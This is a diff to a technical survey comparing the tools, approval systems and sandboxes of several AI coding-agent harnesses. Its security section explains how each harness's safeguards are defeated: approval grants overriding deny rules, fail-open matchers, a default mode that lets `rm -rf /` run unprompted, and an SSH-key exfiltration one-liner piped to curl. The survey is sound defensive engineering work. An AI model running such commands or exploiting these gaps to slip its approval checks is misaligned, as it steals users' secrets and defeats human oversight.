@@ -45,29 +45,27 @@ rule that four of them talk about.
 `read` (a numbered window plus up to three fuzzy siblings on a miss), `glob`, `grep`,
 `edit`/`write`/`apply_patch` (`apply_patch` is the only edit route for `gpt-*`), `task`,
 `webfetch`, `websearch`, `todowrite`, `skill`, `question`, `plan_exit`, `lsp` (nine operations,
-behind an experimental flag), `execute`, `invalid` (a decoy). Its default ruleset is `"*":
-"allow"`, nine tools send `always: ["*"]`, and there is **no sandbox** - and because an approved
-grant is searched *after* the config ruleset in a last-match-wins list, **one "Always" click
-silently disables any config `deny` the pattern covers, including opencode's own `.env` guard.**
+behind an experimental flag), `execute`, `invalid` (a decoy). Default ruleset `"*": "allow"`, nine
+tools send `always: ["*"]`, and there is **no sandbox** - and because an approved grant is
+searched *after* the config ruleset in a last-match-wins list, **one "Always" click silently
+disables any config `deny` the pattern covers, including opencode's own `.env` guard.**
 
-**pi** - four tools active: `read`, `bash`, `edit`, `write`; `grep`, `find`, `ls` and
-`powershell` are opt-in, and there is **no task, todo, web or LSP tool**. `read` gives raw text
-with no line numbers and throws a raw `ENOENT` on a miss; `bash` has **no default timeout**;
-`grep`/`find` shell out to `rg`/`fd` and **download the binary from GitHub on first use**, so two
-nominally read-only tools carry a network side-channel. **No built-in approval system at all**:
-the one gate point is a `beforeToolCall` hook that **returns `undefined` immediately if no
-extension registered a handler**.
+**pi** - four tools active: `read`, `bash`, `edit`, `write`; `grep`, `find`, `ls`, `powershell`
+opt-in; **no task, todo, web or LSP tool**. `read` gives raw text with no line numbers and throws a
+raw `ENOENT` on a miss; `bash` has **no default timeout**; `grep`/`find` shell out to `rg`/`fd`
+and **download the binary from GitHub on first use**, so two nominally read-only tools carry a
+network side-channel. **No approval system at all**: the one gate point is a `beforeToolCall` hook
+that **returns `undefined` immediately if no extension registered a handler**.
 
 **omp** - **`xd://` device mounting**, on by default: tools declaring `loadMode = "discoverable"`
 are **removed from the request's tools array** and driven through `read`/`write` against internal
 URLs. That leaves 14 top-level schemas (`read, write, bash, edit, glob, eval, task, hub, learn,
 manage_skill, todo, ask, grep, web_search`) and 12 devices (`ast_grep, ast_edit, debug, github,
 lsp, checkpoint, rewind, security_scan, memory_edit, retain, recall, reflect`). `read`'s schema is
-`path` alone, with every option riding a selector grammar on the path (`:50-200`, `:raw`, `?q=`,
-`archive.zip:inner`); `browser` and `computer` are **not tools** but preludes in `eval`. Tiers
-`read < write < exec` against modes `always-ask` / `write` / `yolo`, with **an omitted `approval`
-defaulting to `exec`**; `details` is UI-only, so **anything living only in `details` never reaches
-the model**.
+`path` alone, with every option riding a selector grammar on the path (`:50-200`, `:raw`, `?q=`);
+`browser` and `computer` are **not tools** but preludes in `eval`. Tiers `read < write < exec`
+against modes `always-ask` / `write` / `yolo`, with **an omitted `approval` defaulting to
+`exec`**; `details` is UI-only, so **anything living only in `details` never reaches the model**.
 
 **grok-build** - seventeen core tools plus conditionals and a plan-mode trio, and **model-facing
 names are not tool ids**: five tools and two params are renamed (`task` → `spawn_subagent`) and
@@ -76,10 +74,9 @@ full name randomization per deployment is supported. Auto-allow: `read_file`, `l
 `run_terminal_command`/`monitor`, `use_tool`; no prompt at all: `spawn_subagent`, `workflow`,
 `scheduler_*`, `image_*`. **Two classification gaps**: those have no explicit `AccessKind` arm and
 fall through a catch-all `_ => Read(None)`, and `Read` is *unconditionally allowed* with no path,
-so a path-patterned rule cannot match it. Scopes are inconsistent both ways: `scheduler_list`
-declares `Write` for a pure read, while `todo_write` and `update_goal` declare `Read` while
-mutating session state (letibot's `Access` has a `Session` class for exactly this). `search_tool`
-**does not search code** - it is BM25 over the MCP tool index.
+so a path-patterned rule cannot match it. `scheduler_list` declares `Write` for a pure read while
+`todo_write` declares `Read` while mutating session state (letibot's `Access` has a `Session`
+class for exactly this). `search_tool` **does not search code** - it is BM25 over the MCP index.
 
 **dsh** - a Cordis monorepo where ~25 tools are separate plugin packages and **which ones the
 model sees is a composition decision**. The model sees only `name`/`description`/`parameters`;
@@ -110,9 +107,9 @@ before any adjudicator and overridable by none.
 only one that reports the denominator** - the defect that prompted the survey, where letibot's
 `grep` reported an empty corpus as an empty result about a tree holding nine matches.
 
-- **opencode** returns one shared constant, `"No files found"`, from both `grep` and `glob`, and
-  it fires when files *were* searched and nothing matched. Worse, **a `path` that does not exist
-  is not an error either**: the ternary falls through to `path.dirname(search)`, so grep silently
+- **opencode** returns one shared constant, `"No files found"`, from both `grep` and `glob`, and it
+  fires when files *were* searched and nothing matched. Worse, **a `path` that does not exist is
+  not an error either**: the ternary falls through to `path.dirname(search)`, so grep silently
   searches the parent directory.
 - **pi** has no counter and treats ripgrep's exit 1 as success, so glob-matched-nothing and
   pattern-absent land in one branch; hitting the 100-match cap **kills the rg child**, so the
@@ -168,8 +165,7 @@ by writing a reason to `xd://resolve`; plus AST-driven `read` folding, **on by d
 gives parseable code a structural summary with bodies elided. That folding is automatic
 compression, not a query - there is no parameter to ask for "the symbols in this file", and symbol
 search is LSP-backed. The gap in omp's own AST layer is the §2.1 defect one layer up: `ast_grep`
-cannot distinguish "language unsupported" from "file unparseable" from "pattern absent", because
-all three collapse into one zero-match plus a string list.
+cannot distinguish "language unsupported" from "file unparseable" from "pattern absent".
 
 LSP: opencode 9 operations behind an experimental flag; grok-build 6, `default_enabled: false`,
 needing a hand-written `lsp.json` that is folder-trust gated; dsh 4, mounted in no shipped
@@ -210,8 +206,7 @@ adds it to the external-directory allow-list, which three of the others get wron
 are where a cap has no recovery path: opencode's `grep`/`glob` hard 100-row cap has no pagination
 and infers truncation from `rows.length === limit`, so exactly 100 real matches read as truncated;
 grok-build's `read_file` **truncates its 1000-line window silently**; dsh's persistent PTY clips
-at 16 000 chars keeping the *head* and advises a `grep` on a file that does not exist, and its
-compaction pruner inserts `[... tool result middle pruned ...]` with no way back.
+at 16 000 chars keeping the *head* and advises a `grep` on a file that does not exist.
 
 ### 2.6 Edit tooling shape
 
@@ -233,15 +228,12 @@ and on the stock agent `edit` is `allow`, so no card is shown. pi's behaviour is
 surprising: **if any edit needed fuzzy matching, the replacement base becomes the fuzzy-normalized
 whole file**, so every touched line gets smart quotes folded to ASCII whether the model asked or
 not - and `usedFuzzyMatch` appears in neither the result text nor `details`. dsh is exact-only and
-says so in the description, which is the cheapest correct answer; its `minimal` preset's
-alternative reports the line numbers of ambiguous matches, which `edit` does not. letibot's rule,
-from its module doc: **a relaxed match is a diagnosis, never an application** - five
-exact-after-key-mapping rungs, every rung an equality test rather than a distance, and the refusal
-returns the exact bytes so the retry is a copy.
+says so in the description, which is the cheapest correct answer. letibot's rule, from its module
+doc: **a relaxed match is a diagnosis, never an application** - five exact-after-key-mapping rungs,
+every rung an equality test rather than a distance, and the refusal returns the exact bytes so the
+retry is a copy.
 
 ## 3. Sandboxing and permissions
-
-The first pass covered permission *policy* and never searched for sandbox *mechanism*.
 
 **The assumption going in - that nobody has a real sandbox and it would have to be built from
 primitives - is refuted.** Two of the five have genuine kernel enforcement: dsh (bubblewrap, a
@@ -277,11 +269,10 @@ passthrough), backends are **chosen by functional probe** rather than a version 
 **partial enforcement is reported as partial, in the code**. It confines the persistent PTY once
 at spawn and **throws** on any later `sandbox/mode` change, and its "always allow" problem does
 not exist because *the vocabulary has no such option*. Defeated three ways, all named by the
-project: **reads and network are entirely uncontained** (bwrap omits `--unshare-net`, Seatbelt is
-`(allow default)` with only writes denied), so **exfiltration needs no bypass** - `cat
-~/.ssh/id_rsa | curl -T- …` is fully permitted; **the harness is unconfined, and a confined child
-can write what the harness later executes**; and **a shipped preset undoes it**. The safety of a
-dsh deployment is a property of its composition.
+project: **reads and network are entirely uncontained**, so **exfiltration needs no bypass** -
+`cat ~/.ssh/id_rsa | curl -T- …` is fully permitted; **the harness is unconfined, and a confined
+child can write what the harness later executes**; and **a shipped preset undoes it**. The safety
+of a dsh deployment is a property of its composition.
 
 **grok-build** - the parser is load-bearing: it walks the tree-sitter tree against node-kind and
 punctuation allowlists, returns `None` on the first unrecognised node, and that forces one
@@ -302,15 +293,14 @@ fall through to `Read(None)` and are auto-approved with the reason `SAFE_COMMAND
 **omp** - the strict compound parser rejects the whole analysis on `$`, backticks, `( ) < > * ? [
 ] { } ~ | ; &`, on control characters even inside quotes, on `VAR=` prefixes, on 14 interpreter
 names and on ~90 shell-stateful builtins, and normalises the basename before the denylist lookups;
-`printf` is listed because `printf -v` can retarget a later command, `test` because `test -v`
-evaluates command substitutions. **How it is defeated: the default configuration, in one line** -
-the approval mode defaults to `yolo`, whose tier ceiling is `exec`, the top rank, so everything
-auto-approves and `rm -rf /` executes without a prompt; the parser is only consulted for
-user-authored `bash.patterns` rules, which default to empty, so **in a default install no parsing
-gates anything**. Three further defeats for a user who has configured rules: the `deny`/`prompt`
-matcher uses a loose tokenizer and **fails open** when it cannot see the structure; `eval` bypasses
-`bash.patterns` entirely; and a genuinely careful containment primitive exists but is **not wired
-to the model's tools**.
+`printf` is listed because `printf -v` can retarget a later command. **How it is defeated: the
+default configuration, in one line** - the approval mode defaults to `yolo`, whose tier ceiling is
+`exec`, the top rank, so everything auto-approves and `rm -rf /` executes without a prompt; the
+parser is only consulted for user-authored `bash.patterns` rules, which default to empty, so **in
+a default install no parsing gates anything**. Three further defeats for a user who has configured
+rules: the `deny`/`prompt` matcher uses a loose tokenizer and **fails open** when it cannot see the
+structure; `eval` bypasses `bash.patterns` entirely; and a genuinely careful containment primitive
+exists but is **not wired to the model's tools**.
 
 **opencode** - the parse genuinely decomposes (`$(...)`, chains, subshells and function bodies
 each yield their own pattern), and the default TUI opens **no TCP socket at all**. Defeated four
